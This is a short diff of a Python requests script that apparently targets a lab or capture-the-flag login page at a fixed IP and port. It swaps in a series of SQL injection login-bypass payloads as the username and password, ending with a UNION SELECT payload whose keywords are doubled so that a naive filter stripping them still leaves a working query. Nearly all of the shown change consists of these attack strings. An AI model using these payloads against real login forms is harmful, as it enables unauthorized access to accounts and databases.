@@ -4,10 +4,18 @@ import requests
 url = 'http://140.115.59.7:12005/'  # Replace 'your_website_url_here' with the actual URL
 
 # Set your username and password
-# username = 'AND 1=1--'
-# password = 'AND 1=1--'
-username = 'AND 1=1--'
-password = 'AND 1=1--'
+# username = '''AND 1=1--'''
+# password = '''AND 1=1--'''
+
+# username = '''' or '1'='1'''
+# password = '''' or '1'='1'''
+
+# username = '''idtjohn88'''
+# password = '''' or '1'='1'''
+
+username = '''' uniounionn selecselectt NULL, 'idtjohn88', 'z'-- '''
+password = '''z'''
+
 
 # Craft the POST request data
 data = {
